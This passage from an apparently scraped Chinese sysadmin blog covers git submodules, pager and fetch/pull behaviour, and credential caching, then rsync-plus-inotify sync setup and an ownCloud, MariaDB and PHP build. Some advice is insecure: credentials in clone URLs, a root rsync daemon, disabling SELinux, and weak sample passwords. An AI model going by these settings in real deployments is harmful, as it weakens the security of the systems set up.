deinit -f --all Cleared directory 'themes/yasimple' Submodule 'themes/yasimple' (git@github.com:tankywoo/yasimple.git) unregistered for path 'themes/yasimple' Cleared directory 'themes/yasimple_x2' Submodule 'themes/yasimple_x2' (git@git.coding.net:tankywoo/yasimple_x2.git) unregistered for path 'themes/yasimple_x2' $ git submodule status -abf682ed9f412b28e3147e6774b2dc3daa96efbd themes/yasimple -691af22bdfe5315540934809fb9374567f9b7af8 themes/yasimple_x2 如果要删除子模块，而不是撤销，则需要使用git rm命令：\n$ git rm themes/yasimple themes/yasimple_x2 rm 'themes/yasimple' rm 'themes/yasimple_x2' $ git submodule status # 输出空 之前没注意，使用deinit后发现没完全清除子模块，于是直接手动删掉.gitmodules文件，导致后来clone报错：\n No submodule mapping found in .gitmodule for \u0026hellip;\n 子模块的文件mode是160000:\n$ git ls-files --stage | grep 160000 这样也可以看到实际上子模块还存在，没彻底删除。参考\ngit diff 相关 关于 git diff A..B 和 git diff A...B:\n图片来源\n参考:\n What are the differences between double-dot “..” and triple-dot “…” in Git diff commit ranges? git diff doesn\u0026rsquo;t show enough What are the differences between double-dot “..” and triple-dot “…” in Git commit ranges?  git diff 一行太长, 输出混乱 比如一行非常长, 超过了一行, 导致git diff时的输出比较混乱, 超过一行的会覆盖行首的内容, 而不是换行.\n本地的环境变量如下:\n$ echo $PAGER less $ echo $LESS -R $PAGER 用于控制文件的显示, 被man或其它程序使用. 可以定义为常用的命令如less, more等.\n$PAGER也可以配置为命令加参数选项, 不过更好的方式是配置在各自的环境变量, 如less的$LESS, more的$MORE.\n The pager called by man and other such programs when you tell them to view a file.\n git自身也有一个环境变量$GIT_PAGER, 如果配置了, 则会覆盖系统的$PAGER.\n所以这里的情况可以:\nGIT_PAGER='less -RS' git diff /path/to/file 或者应用到git配置中:\ngit config core.pager 'less -RS' 默认情况, 超过一个屏幕的一行, 会使用wrapped换行, -S将行为改为chopped (truncated), 即隐藏超出一个屏幕宽度的内容, 但是可以右移来显示出来.\n另外, -R和-r这两个的区别我还没弄清楚:\n Like -r, but only ANSI \u0026ldquo;color\u0026rdquo; escape sequences are output in \u0026ldquo;raw\u0026rdquo; form. Unlike -r, the screen appearance is maintained correctly in most cases\n 在$TERM=screen和$TERM=screen-256color时, -r可以正确的wrapped换行, 而-R不行, 不过在指定git diff --no-color时-R可以正确换行. TODO\n另外, 我平时经常实用的一个工具cdiff, 没有使用$GIT_PAGER, 所以需要配置$PAGER\n参考:\n git diff - handling long lines? Configuring your console pager  git fetch/pull 小记 一个需求: 假设我在dev分支, 现在我想先更新master分支的代码, 再checkout过去。解决办法:\ngit fetch origin master:master 在这块遇到了一些之前没注意的问题, 简单记录下。\n首先完整的fetch/pull命令是:\ngit fetch/pull [\u0026lt;options\u0026gt;] [\u0026lt;repository\u0026gt; [\u0026lt;refspec\u0026gt;...]] 基本都知道的是pull就是比fetch多了一个merge。\n主仓库master:\n* 2d666bc - (HEAD -\u0026gt; master) Merge branch 'dev' (2 hours ago) \u0026lt;Tanky Woo\u0026gt; |\\ | * 9337ee5 - dev 1 (2 hours ago) \u0026lt;Tanky Woo\u0026gt; |/ * 66f72b2 - init (2 hours ago) \u0026lt;Tanky Woo\u0026gt; 主仓库dev:\n* 07e3298 - (HEAD -\u0026gt; dev) dev 2 (61 minutes ago) \u0026lt;Tanky Woo\u0026gt; * 9337ee5 - dev 1 (2 hours ago) \u0026lt;Tanky Woo\u0026gt; * 66f72b2 - init (2 hours ago) \u0026lt;Tanky Woo\u0026gt; 子仓库master:\n* 66f72b2 - (HEAD -\u0026gt; master, origin/master) init (2 hours ago) \u0026lt;Tanky Woo\u0026gt; 子仓库dev:\n* 9337ee5 - (HEAD -\u0026gt; dev, origin/dev, origin/HEAD) dev 1 (2 hours ago) \u0026lt;Tanky Woo\u0026gt; * 66f72b2 - (origin/master, master) init (2 hours ago) \u0026lt;Tanky Woo\u0026gt; 即master合并了dev的9337ee5提交后, dev又新增了一个提交。\n最常规的操作就是直接执行git pull:\n$ git pull remote: Counting objects: 4, done. remote: Compressing objects: 100% (2/2), done. remote: Total 4 (delta 1), reused 0 (delta 0) Unpacking objects: 100% (4/4), done. From /path/to/repo 9337ee5..07e3298 dev -\u0026gt; origin/dev 66f72b2..2d666bc master -\u0026gt; origin/master Updating 9337ee5..07e3298 Fast-forward hello.txt | 1 + 1 file changed, 1 insertion(+) 子仓库master提交没有任何更新, 有behind提示:\nYour branch is behind 'origin/master' by 2 commits, and can be fast-forwarded. (use \u0026quot;git pull\u0026quot; to update your local branch) nothing to commit, working directory clean 子仓库dev:\n* 07e3298 - (HEAD -\u0026gt; dev, origin/dev, origin/HEAD) dev 2 (64 minutes ago) \u0026lt;Tanky Woo\u0026gt; * 9337ee5 - dev 1 (2 hours ago) \u0026lt;Tanky Woo\u0026gt; * 66f72b2 - (master) init (2 hours ago) \u0026lt;Tanky Woo\u0026gt; 输出的内容分为两部分:\n# -------- fetch的内容 -------- From /path/to/repo 9337ee5..07e3298 dev -\u0026gt; origin/dev 66f72b2..2d666bc master -\u0026gt; origin/master Updating 9337ee5..07e3298 # -------- merge的内容 -------- Fast-forward hello.txt | 1 + 1 file changed, 1 insertion(+) 之前对这块研究过一次, 不过时间有点久远, 给忘了。\ndev -\u0026gt; origin/dev 表示远端的dev写入到本地的origin/dev。\n输出(或者说实际结果)表示, 默认情况下(可以看看.git/config下的fetch配置), 这个操作会:\n (fetch)遍历远端所有的refs, 然后更新到本地的remote/refs (merge)远端跟踪分支到当前分支(dev分支)  按照之前的需求, 我猜测pull执行refspec应该可以, 于是执行下面:\n$ git pull origin master:master remote: Counting objects: 1, done. remote: Total 1 (delta 0), reused 0 (delta 0) Unpacking objects: 100% (1/1), done. From /path/to/repo 66f72b2..2d666bc master -\u0026gt; master 66f72b2..2d666bc master -\u0026gt; origin/master Updating 9337ee5..2d666bc Fast-forward 子仓库master分支:\n* 2d666bc - (HEAD -\u0026gt; master, origin/master, dev) Merge branch 'dev' (2 hours ago) \u0026lt;Tanky Woo\u0026gt; |\\ | * 9337ee5 - (origin/dev, origin/HEAD) dev 1 (2 hours ago) \u0026lt;Tanky Woo\u0026gt; |/ * 66f72b2 - init (2 hours ago) \u0026lt;Tanky Woo\u0026gt; 子仓库dev分支:\n* 2d666bc - (HEAD -\u0026gt; dev, origin/master, master) Merge branch 'dev' (2 hours ago) \u0026lt;Tanky Woo\u0026gt; |\\ | * 9337ee5 - (origin/dev, origin/HEAD) dev 1 (2 hours ago) \u0026lt;Tanky Woo\u0026gt; |/ * 66f72b2 - init (2 hours ago) \u0026lt;Tanky Woo\u0026gt; 可以看到, 子仓库的master分支和dev分支变成一样的历史, 且都和主仓库的master分支历史树一样。\ngit pull repo src:dst 的实际操作就是:\n 如果可以做fast-forward, 那么做ff操作把本地的master同步为远端的master 然后把本地master合并到当前分支  man git-pull:\n The remote ref that matches is fetched, and if is not empty string, the local ref that matches it is fast-forwarded using .\n 也就是dev作了一次: (at dev) $ git merge --ff-only master。\n最后正确的办法, 也就是不需要上面pull的第二步merge, 即只使用fetch:\n$ git fetch origin master:master remote: Counting objects: 1, done. remote: Total 1 (delta 0), reused 0 (delta 0) Unpacking objects: 100% (1/1), done. From /path/to/repo 66f72b2..2d666bc master -\u0026gt; master 66f72b2..2d666bc master -\u0026gt; origin/master 子仓库master分支:\n* 2d666bc - (HEAD -\u0026gt; master, origin/master) Merge branch 'dev' (2 hours ago) \u0026lt;Tanky Woo\u0026gt; |\\ | * 9337ee5 - (origin/dev, origin/HEAD, dev) dev 1 (2 hours ago) \u0026lt;Tanky Woo\u0026gt; |/ * 66f72b2 - init (2 hours ago) \u0026lt;Tanky Woo\u0026gt; 子仓库dev分支:\n* 9337ee5 - (HEAD -\u0026gt; dev, origin/dev, origin/HEAD) dev 1 (2 hours ago) \u0026lt;Tanky Woo\u0026gt; * 66f72b2 - init (2 hours ago) \u0026lt;Tanky Woo\u0026gt; 之前只是单纯的以为fetch只做拉去更新remote/ref, 但是不做实际的本地合并等修改, 看来这个认识是错的。\n另外, 这个还有 +加号的涉及到的no-ff问题, 后续再研究下。\n参考:\n Merge, update, and pull Git branches without using checkouts Git pull/fetch with refspec differences pro git: 9.5 Git 内部原理 - The Refspec  缓存用户名/密码 Git 的 pull/push url 如果是 http/https 的情况下，每次执行 pull 或 push 都需要交互式输入用户名和密码。\nGit 提供了 credential cache 的功能，就是将第一次输入的用户名密码缓存到内存一段时间，后续这个时间段内的 git 操作如果需要输入用户名密码，都可以从这个缓存中获取。\n详细见文档：git-credential-cache 和 Caching your GitHub password in Git\n比如在一个 git 项目里，执行（例子来源上面链接的文档）：\n$ git config credential.helper cache $ git push http://example.com/repo.git Username: \u0026lt;type your username\u0026gt; Password: \u0026lt;type your password\u0026gt; [work for 5 more minutes] $ git push http://example.com/repo.git [your credentials are used automatically] 如果 git config 没有指定 --global 全局配置，则写操作默认（--local）只针对当前项目，后续还有其它项目，则需要在 pull/push 之前先再执行 git config credential.helper cache 使这个项目也配置 cache。\n另外，默认的缓存时间目前是 900s，也可以改超时时间：\n$ git config credential.helper 'cache --timeout=300' 题外话：\n最近写一个脚本，习惯在脚本开始获取 git 的用户名密码保存在变量中，然后后续使用，也可以如下：\nread -p \u0026quot;Input git username: \u0026quot; GIT_USER read -s -p \u0026quot;Input git password: \u0026quot; GIT_PASS git clone http://${GIT_USER}:${GIT_PASS}@example.com/repo.git 另外一个情况，很多工具可以通过环境变量指定用户名密码，如：USERNAME=tankywoo PASSWORD=*** my-command\ngit 也可以实现这种情况，关于 credential，git 默认提供两种方式（helper）：cache 和 store，后者存在磁盘。\n但是其也支持使用第三方 helper，可以实现这个功能：\n# on Gentoo $ cat /usr/libexec/git-core/git-credential-read-env #!/bin/bash if [[ $# -eq 1 \u0026amp;\u0026amp; $1 == \u0026quot;get\u0026quot; ]] ; then if [[ -z ${USERNAME} || -z ${PASSWORD} ]] ; then exit 0 fi echo \u0026quot;username=${USERNAME}\u0026quot; echo \u0026quot;password=${PASSWORD}\u0026quot; fi exit 0 $ cat ~/.gitconfig [credential] helper = read-env $ USERNAME=tankywoo PASSWORD=*** git pull 具体需要看 gitcredentials 和 man git-credential。\n将自定义的脚本放到指令路径下，通过git help -a | grep credential- 可以搜到，然后配置 [credential]，名称为不包含git-credential-的名字即可。\n（TODO：有一个坑，在 zsh 下报错：remote: HTTP Basic: Access denied，暂时未找到原因。）\nGit资料  ProGit中文版 Git Reference  ","permalink":"https://www.fenghong.tech/blog/intro/git/","tags":["git"],"title":"Git"},{"categories":["ops"],"contents":"rsync 什么是rsync rsync是一个远程数据同步工具，可通过LAN/WAN快速同步多台主机间的文件。它使用所谓的“Rsync演算法”来使本地和远程两个主机之间的文件达到同步，这个算法只传送两个文件的不同部分，而不是每次都整份传送，因此速度相当快。所以通常可以作为备份工具来使用。\n运行Rsync server的机器也叫backup server，一个Rsync server可同时备份多个client的数据；也可以多个Rsync server备份一个client的数据。Rsync可以搭配ssh甚至使用daemon模式。Rsync server会打开一个873的服务通道(port)，等待对方rsync连接。连接时，Rsync server会检查口令是否相符，若通过口令查核，则可以开始进行文件传输。第一次连通完成时，会把整份文件传输一次，下一次就只传送二个文件之间不同的部份。\n基本特点：\n 可以镜像保存整个目录树和文件系统； 可以很容易做到保持原来文件的权限、时间、软硬链接等； 无须特殊权限即可安装； 优化的流程，文件传输效率高； 可以使用rcp、ssh等方式来传输文件，当然也可以通过直接的socket连接； 支持匿名传输。  rsync同步过程： rsync在同步文件的时候， 接收端会从发送端的数据中读取由文件索引号确认的文件. 然后打开本地文件(被称为基础文件), 建立一个临时文件. 接收端会读取非匹配数据和匹配数据, 并按顺序重组他们成为最终文件. 当非匹配数据被读取, 它会被写入到临时文件. 当收到一个块匹配记录, 接收端会寻找这个块在基础文件中的偏移量, 将这个块拷贝到临时文件. 通过这种方式, 临时文件被从头到尾建立起来. 建立临时文件的时候生成了文件的校验. 重建文件结束后, 这个校验和来自发送端的校验比较. 如果校验不符, 临时文件会被删除. 如果失败一次, 文件会再被处理一次. 如果失败第二次, 一个错误会被报告. 临时文件建立后, 所有者, 权限和修改时间会被设置. 然后它会被重命名已替代基础文件.\nRsync工作原理 1）软件简介\nRsync 是一个远程数据同步工具，可通过 LAN/WAN 快速同步多台主机间的文件。Rsync 本来是用以取代rcp 的一个工具，它当前由 Rsync.samba.org 维护。Rsync 使用所谓的“Rsync 演算法”来使本地和远程两个主机之间的文件达到同步，这个算法只传送两个文件的不同部分，而不是每次都整份传送，因此速度相当快。运行 Rsync server 的机器也叫 backup server，一个 Rsync server 可同时备份多个 client 的数据；也可以多个Rsync server 备份一个 client 的数据。\nRsync 可以搭配 rsh 或 ssh 甚至使用 daemon 模式。Rsync server 会打开一个873的服务通道（port），等待对方 Rsync 连接。连接时，Rsync server 会检查口令是否相符，若通过口令查核，则可以开始进行文件传输。第一次连通完成时，会把整份文件传输一次，下一次就只传送二个文件之间不同的部份。\nRsync 支持大多数的类 Unix 系统，无论是 Linux、Solaris 还是 BSD 上都经过了良好的测试。此外，它在windows 平台下也有相应的版本，比较知名的有 cwRsync 和 Sync2NAS。\nRsync 的基本特点如下：\n可以镜像保存整个目录树和文件系统； 可以很容易做到保持原来文件的权限、时间、软硬链接等； 无须特殊权限即可安装； 优化的流程，文件传输效率高； 可以使用 rcp、ssh 等方式来传输文件，当然也可以通过直接的 socket 连接； 支持匿名传输。\n2）核心算法\n假定在名为 α 和 β 的两台计算机之间同步相似的文件 A 与 B，其中 α 对文件A拥有访问权，β 对文件 B 拥有访问权。并且假定主机 α 与 β 之间的网络带宽很小。那么 Rsync 算法将通过下面的五个步骤来完成：\nβ 将文件 B 分割成一组不重叠的固定大小为 S 字节的数据块。最后一块可能会比 S 小。 β 对每一个分割好的数据块执行两种校验：一种是32位的滚动弱校验，另一种是128位的 MD4 强校验。 β 将这些校验结果发给 α。 α 通过搜索文件 A 的所有大小为 S 的数据块（偏移量可以任选，不一定非要是 S 的倍数），来寻找与文件B 的某一块有着相同的弱校验码和强校验码的数据块。这项工作可以借助滚动校验的特性很快完成。 α 发给 β 一串指令来生成文件 A 在 β 上的备份。这里的每一条指令要么是对文件 B 经拥有某一个数据块而不须重传的证明，要么是一个数据块，这个数据块肯定是没有与文件 B 的任何一个数据块匹配上的。\n3） 文件级别的RSync（只传输变化的文件）工作过程：（我的理解）\n* 机器A构造FileList，FileList包含了需要与机器B sync的所有文件信息对name-\u0026gt;id,（id用来唯一表示文件例如MD5）； * 机器A将FileList发送到机器B； * 机器B上运行的后台程序处理FileList，构建NewFileList，其中根据MD5的比较来删除机器B上已经存在的文件的信息对，只保留机器B上不存在或变化的文件; * 机器A得到NewFileList，对NewFileList中的文件从新传输到机器B；\n安装： rsync在CentOS6上默认已经安装，如果没有则可以使用yum install rsync -y，服务端和客户端是同一个安装包。\n同步到远程服务器 在服务器间rsync传输文件，需要有一个是开着rsync的服务，而这一服务需要两个配置文件，说明当前运行的用户名和用户组，这个用户名和用户组在改变文件权限和相关内容的时候有用，否则有时候会出现提示权限问题。配置文件也说明了模块、模块化管理服务的安全性，每个模块的名称都是自己定义的，可以添加用户名密码验证，也可以验证IP，设置目录是否可写等，不同模块用于同步不同需求的目录。\n服务端配置文件 /etc/rsyncd.conf：\n#2014-12-11 by Sean uid = root gid = root use chroot = no pid file = /var/run/rsyncd.pid log file = /var/log/rsyncd.log port = 873 read only = no [qianxiang] path = /data/qianxiang/web/ ignore errors auth users = root secrets file = /etc/rsyncd.secrets hosts allow = 192.168.1.1 hosts deny = * [file] path = /data/cun_web/ ignore errors auth users = root secrets file = /etc/rsyncd.secrets hosts allow = 192.168.1.1 hosts deny = * [nginx] path = /etc/nginx/ ignore errors auth users = root secrets file = /etc/rsyncd.secrets hosts allow = 192.168.1.1 hosts deny = * 这里配置socket方式传输文件，端口873，[module_test]开始定义一个模块，指定要同步的目录（接收）path，授权用户，密码文件，允许哪台服务器IP同步（发送）等。\n经测试，上述配置文件每行后面不能使用#来来注释\n/etc/rsyncd.secrets：\nroot:passw0rd 一行一个用户，用户名:密码。请注意这里的用户名和密码与操作系统的用户名密码无关，可以随意指定，与/etc/rsyncd.conf中的auth users对应。\n修改权限：chmod 600 /etc/rsyncd.d/rsync_server.pwd。\n服务器启动rsync后台服务 修改/etc/xinetd.d/rsync文件，disable 改为 no\n# default: off # description: The rsync server is a good addition to an ftp server, as it \\ #\tallows crc checksumming etc. service rsync { disable\t= no flags\t= IPv6 socket_type = stream wait = no user = root server = /usr/bin/rsync server_args = --daemon log_on_failure += USERID } 执行service xinetd restart会一起重启rsync后台进程，默认使用配置文件/etc/rsyncd.conf。也可以使用/usr/bin/rsync --daemon --config=/etc/rsyncd.conf，重启建议pkill rsync \u0026amp;\u0026amp; sleep 1 \u0026amp;\u0026amp; /usr/bin/rsync --daemon --config=/etc/rsyncd.conf \n为了以防rsync写入过多的无用日志到/var/log/message（容易塞满从而错过重要的信息），建议注释掉/etc/xinetd.conf的success：\n# log_on_success = PID HOST DURATION EXIT 如果使用了防火墙，要添加允许IP到873端口的规则。\n# iptables -A INPUT -p tcp -m state --state NEW -m tcp --dport 873 -j ACCEPT # iptables -L 查看一下防火墙是不是打开了 873端口 # netstat -anp|grep 873 建议关闭selinux，可能会由于强访问控制导致同步报错\n客户端测试同步 单向同步时，客户端只需要一个包含密码的文件。 /etc/rsync_client.pwd：\npassw0rd chmod 600 /etc/rsync_client.pwd\n命令： 将本地/root/目录同步到远程192.168.1.1的/tmp/rsync_bak2目录（module_test指定）：\n/usr/bin/rsync -auvrtzopgP --progress --password-file=/etc/rsync_client.pwd /root/ sean@192.168.1.1::file 当然你也可以将远程的/tmp/rsync_bak2目录同步到本地目录/root/tmp：\n/usr/bin/rsync -auvrtzopgP --progress --password-file=/etc/rsync_client.pwd sean@192.168.1.1::filet /root/ 从上面两个命令可以看到，其实这里的服务器与客户端的概念是很模糊的，rsync daemon都运行在远程172.29.88.223上，第一条命令是本地主动推送目录到远程，远程服务器是用来备份的；第二条命令是本地主动向远程索取文件，本地服务器用来备份，也可以认为是本地服务器恢复的一个过程。\ninotify-tools 什么是inotify inotify是一种强大的、细粒度的、异步的文件系统事件监控机制，Linux内核从2.6.13开始引入，允许监控程序打开一个独立文件描述符，并针对事件集监控一个或者多个文件，例如打开、关闭、移动/重命名、删除、创建或者改变属性。\nCentOS6自然已经支持： 使用ll /proc/sys/fs/inotify命令，是否有以下三条信息输出，如果没有表示不支持。\ntotal 0 -rw-r--r-- 1 root root 0 Dec 11 15:23 max_queued_events -rw-r--r-- 1 root root 0 Dec 11 15:23 max_user_instances -rw-r--r-- 1 root root 0 Dec 11 15:23 max_user_watches  /proc/sys/fs/inotify/max_queued_evnets表示调用inotify_init时分配给inotify instance中可排队的event的数目的最大值，超出这个值的事件被丢弃，但会触发IN_Q_OVERFLOW事件。 /proc/sys/fs/inotify/max_user_instances表示每一个real user ID可创建的inotify instatnces的数量上限。 /proc/sys/fs/inotify/max_user_watches表示每个inotify instatnces可监控的最大目录数量。如果监控的文件数目巨大，需要根据情况，适当增加此值的大小。  安装 inotify-tools：\ninotify-tools是为linux下inotify文件监控工具提供的一套C的开发接口库函数，同时还提供了一系列的命令行工具，这些工具可以用来监控文件系统的事件。 inotify-tools是用c编写的，除了要求内核支持inotify外，不依赖于其他。inotify-tools提供两种工具，一是inotifywait，它是用来监控文件或目录的变化，二是inotifywatch，它是用来统计文件系统访问的次数。\n下载inotify-tools-3.14-1.el6.x86_64.rpm，通过rpm包安装：\n$ rpm -ivh inotify-tools-3.14-1.el6.x86_64.rpm inotifywait使用示例 监控/root/tmp目录文件的变化：\n/usr/bin/inotifywait -mrq --timefmt '%Y/%m/%d-%H:%M:%S' --format '%T %w %f' \\ -e modify,delete,create,move,attrib /root/tmp/ 上面的命令表示，持续监听/root/tmp目录及其子目录的文件变化，监听事件包括文件被修改、删除、创建、移动、属性更改，显示到屏幕。执行完上面的命令后，在/root/tmp下创建或修改文件都会有信息输出：\n创建排除在外不同步的文件列表 排除不需要同步的文件或目录有两种做法，第一种是inotify监控整个目录，在rsync中加入排除选项，简单；第二种是inotify排除部分不监控的目录，同时rsync中也要加入排除选项，可以减少不必要的网络带宽和CPU消耗。我们选择第二种。\ninotifywait排除 这个操作在客户端进行，假设/tmp/src/mail/2014/以及/tmp/src/mail/2015/cache/目录下的所有文件不用同步，所以不需要监控，/tmp/src/下的其他文件和目录都同步。（其实对于打开的临时文件，可以不监听modify时间而改成监听close_write）\ninotifywait排除监控目录有--exclude \u0026lt;pattern\u0026gt;和--fromfile \u0026lt;file\u0026gt;两种格式，并且可以同时使用，但主要前者可以用正则，而后者只能是具体的目录或文件。\n# vi /etc/inotify_exclude.lst： /tmp/src/pdf @/tmp/src/2014 使用fromfile格式只能用绝对路径，不能使用诸如*正则表达式去匹配，@表示排除。\n如果要排除的格式比较复杂，必须使用正则，那只能在inotifywait中加入选项，如--exclude '(.*/*\\.log|.*/*\\.swp)$|^/tmp/src/mail/(2014|201.*/cache.*)'，表示排除/tmp/src/mail/以下的2014目录，和所有201*目录下的带cache的文件或目录，以及/tmp/src目录下所有的以.log或.swp结尾的文件。\nrsync排除 使用inotifywait排除监控目录的情况下，必须同时使用rsync排除对应的目录，否则只要有触发同步操作，必然会导致不该同步的目录也会同步。与inotifywait类似，rsync的同步也有--exclude和--exclude-from两种写法。\n个人还是习惯将要排除同步的目录卸载单独的文件列表里，便于管理。使用--include-from=FILE时，排除文件列表用绝对路径，但FILE里面的内容请用相对路径，如： /etc/rsyncd.d/rsync_exclude.lst：\nmail??* src/*.html* src/js/ src/ext3/ src/2014/20140[1-9]/ src/201*/201*/201*/.??* membermail/ membermail??* membermail/201*/201*/201*/.??* 客户端同步到远程的脚本rsync.sh 下面是一个完整的同步脚本，请根据需要进行裁剪，rsync.sh：\n#variables current_date=$(date +%Y%m%d_%H%M%S) source_path=/tmp/src/ log_file=/var/log/rsync_client.log #rsync rsync_server=192.168.1.1 rsync_user=sean rsync_pwd=/etc/rsync_client.pwd rsync_module=file INOTIFY_EXCLUDE='(.*/*\\.log|.*/*\\.swp)$|^/tmp/src/mail/(2014|20.*/.*che.*)' RSYNC_EXCLUDE='/etc/rsyncd.d/rsync_exclude.lst' #rsync client pwd check if [ ! -e ${rsync_pwd} ];then echo -e \u0026quot;rsync client passwod file ${rsync_pwd} does not exist!\u0026quot; exit 0 fi #inotify_function inotify_fun(){ /usr/bin/inotifywait -mrq --timefmt '%Y/%m/%d-%H:%M:%S' --format '%T %w %f' \\ --exclude ${INOTIFY_EXCLUDE} -e modify,delete,create,move,attrib ${source_path} \\ | while read file do /usr/bin/rsync -auvrtzopgP --exclude-from=${RSYNC_EXCLUDE} --progress --bwlimit=1000 --password-file=${rsync_pwd} ${source_path} ${rsync_user}@${rsync_server}::${rsync_module} done } #inotify log inotify_fun \u0026gt;\u0026gt; ${log_file} 2\u0026gt;\u0026amp;1 \u0026amp; --bwlimit=1000用于限制传输速率最大1000kb，因为在实际应用中发现如果不做速率限制，会导致巨大的CPU消耗。\n在客户端运行脚本# ./rsync.sh即可实时同步目录.\n","permalink":"https://www.fenghong.tech/blog/2018/2018-11-07-rsync-inotify/","tags":["Linux","rsync","iNotify"],"title":"rsync和inotify实现文件同步"},{"categories":["ownCloud"],"contents":"owncloud的功能  存储：图片，文档，视频，通讯录以及其他等等 客户端支持：Android，IOS,MaxOS,Windows,Web,Linux 分享：可以直接共享直接链接给授权过的同事 在线看视频，文档，音乐。 可以自行修改功能（作为开发者）  系统安装环境 CPU model : Intel(R) Xeon(R) Platinum 8163 CPU @ 2.50GHz Number of cores : 2 CPU frequency : 2500.028 MHz Total amount of ram : 16042 MB Total amount of swap : 4096 MB System uptime : 0days, 0:7:13 Load average : 0.00, 0.08, 0.06 OS : CentOS 7.5.1804 Arch : x86_64 (64 Bit) Kernel : 3.10.0-862.14.4.el7.x86_64 Hostname : ********** IPv4 address : ********** 安装预览\nnginx: nginx-1.15.5 nginx Location: /usr/local/nginx /etc/nginx/ MariaDB: mariadb-10.2.18 MariaDB Location: /usr/local/mariadb MariaDB Data Location: /data/mysql MariaDB Root Password: ************* PHP: php-7.2.11 PHP Location: /usr/local/php PHP Additional Modules: redis.io intl.so mysql二进制安装 $ wget http://mirrors.aliyun.com/mariadb//mariadb-10.2.18/bintar-linux-glibc_214-x86_64/mariadb-10.2.18-linux-glibc_214-x86_64.tar.gz $ tar xf mariadb-10.2.18-linux-glibc_214-x86_64.tar.gz -C /usrlocal/ $ mv /usr/local/mariadb-10.2.15-linux-x86_64 /usr/local/mariadb $ chown -R mysql:mysql /usr/local/mariadb /data/mysql $ /usr/local/mariadb/scripts/mysql_install_db --basedir=/usr/local/mariadb} --datadir=/data/mysql --user=mysql $ vim /etc/my.conf [mysql] # CLIENT # port = 3306 socket = /tmp/mysql.sock [mysqld] # GENERAL # port = 3306 user = mysql default-storage-engine = InnoDB socket = /tmp/mysql.sock pid-file = /data/mysql/mysql.pid skip-name-resolve skip-external-locking # INNODB # innodb-log-files-in-group = 2 innodb-log-file-size = 256M innodb-flush-log-at-trx-commit = 2 innodb-file-per-table = 1 innodb-buffer-pool-size = 2G # CACHES AND LIMITS # tmp-table-size = 32M max-heap-table-size = 32M max-connections = 4000 thread-cache-size = 50 open-files-limit = 4096 table-open-cache = 1600 # SAFETY # max-allowed-packet = 16M max-connect-errors = 1000000 # DATA STORAGE # datadir = /data/mysql # LOGGING # log-error = /data/mysql/mysql-error.log log-bin\t= /data/mysql/mysql-bin max_binlog_size\t= 1073741824 binlog-format\t= row 文件软连接及启动脚本 $ ln -s /usr/local/mariadb/bin/mysql /usr/bin/mysql $ ln -s /usr/local/mariadb/bin/mysqldump /usr/bin/mysqldump $ ln -s /usr/local/mariadb/bin/mysqladmin /usr/bin/mysqladmin $ cp -f /usr/local/mariadb/support-files/mysql.server /etc/init.d/mysqld $ sed -i \u0026quot;s:^basedir=.*:basedir=/usr/local/mariadb:g\u0026quot; /etc/init.d/mysqld $ sed -i \u0026quot;s:^datadir=.*:datadir=/data/mysql:g\u0026quot; /etc/init.d/mysqld 创建owncloud用户\n$ /etc/init.d/mysqld start $ mysql -u root -p MariaDB [(none)] \u0026gt; create database owncloud; MariaDB [(none)] \u0026gt; GRANT ALL ON owncloud.* TO ocuser@localhost IDENTIFIED BY 'owncloud'; MariaDB [(none)] \u0026gt; flush privileges; MariaDB [(none)] \u0026gt; exit PHP编译安装  编译安装libconv  $ wget http://ftp.gnu.org/pub/gnu/libiconv/libiconv-1.15.tar.gz $ tar -zxvf libiconv-1.15.tar.gz $ cd libiconv-1.15 $ ./configure --prefix=/usr/local/libiconv $ make $ make install $ libtool --finish /usr/local/libiconv/lib 编译安装php7.2.11  $ yum -y install wget vim pcre pcre-devel openssl openssl-devel libicu-devel gcc gcc-c++ autoconf libjpeg libjpeg-devel libpng libpng-devel freetype freetype-devel libxml2 libxml2-devel zlib zlib-devel glibc glibc-devel glib2 glib2-devel ncurses ncurses-devel curl curl-devel krb5-devel libidn libidn-devel openldap openldap-devel nss_ldap jemalloc-devel cmake boost-devel bison automake libevent libevent-devel gd gd-devel libtool* libmcrypt libmcrypt-devel mcrypt mhash libxslt libxslt-devel readline readline-devel gmp gmp-devel libcurl libcurl-devel openjpeg-devel $ wget http://101.96.10.64/cn2.php.net/distributions/php-7.2.11.tar.gz $ tar xf php-7.2.11.tar.gz \u0026amp;\u0026amp; cd php-7.2.11 $ ./configure --prefix=/usr/local/php --with-config-file-path=/etc --enable-fpm --with-fpm-user=nginx --with-fpm-group=nginx --enable-inline-optimization --disable-debug --disable-rpath --enable-shared --enable-soap --with-libxml-dir --with-xmlrpc --with-openssl --with-mhash --with-pcre-regex --with-sqlite3 --with-zlib --enable-bcmath --with-iconv=/usr/local/libiconv --with-bz2 --enable-calendar --with-curl --with-cdb --enable-dom --enable-exif --enable-fileinfo --enable-filter --with-pcre-dir --enable-ftp --with-gd --with-openssl-dir --with-jpeg-dir --with-png-dir --with-zlib-dir --with-freetype-dir --enable-gd-jis-conv --with-gettext --with-gmp --with-mhash --enable-json --enable-mbstring --enable-mbregex --enable-mbregex-backtrack --with-libmbfl --with-onig --enable-pdo --with-mysqli=mysqlnd --with-pdo-mysql=mysqlnd --with-zlib-dir --with-pdo-sqlite --with-readline --enable-session --enable-shmop --enable-simplexml --enable-sockets --enable-sysvmsg --enable-sysvsem --enable-sysvshm --enable-wddx --with-libxml-dir --with-xsl --enable-zip --enable-mysqlnd-compression-support --with-pear --enable-opcache $ make -j 2 \u0026amp;\u0026amp; make install #2核编译。 $ cp /usr/local/php/etc/php-fpm.conf.default /usr/local/php/etc/php-fpm.conf $ cp /usr/local/php/etc/php-fpm.d/www.conf.default /usr/local/php/etc/php-fpm.d/www.conf $ cp php.ini-production /usr/local/php/etc/php.ini $ cp sapi/fpm/init.d.php-fpm /etc/init.d/php-fpm $ /etc/init.d/php-fpm start 编译安装redis.io，intl.io  #redis.io $ wget http://pecl.php.net/get/redis-4.0.2.tgz $ tar xf redis-4.0.2.tgz $ cd redis-4.0.2 $ find / -name php-config $ ./configure --with-php-config=/usr/local/php/bin/php-config $ make \u0026amp;\u0026amp; make install $ vim /usr/local/php/etc/php.ini extentions=redis.io extension = \u0026quot;redis.so\u0026quot; #icu编译安装 $ mkdir /usr/local/icu $ wget http://download.icu-project.org/files/icu4c/52.1/icu4c-52_1-src.tgz $ tar xf icu4c-52_1-src.tgz $ cd icu $ ls $ cd source/ $ ./configure --prefix=/usr/local/icu $ make -j 2 \u0026amp;\u0026amp; make install #intl安装 $ cd /data/downloads/php-7.2.11/ext/intl $ phpize $ ./configure --enable-intl --with-icu-dir=/usr/local/icu/ 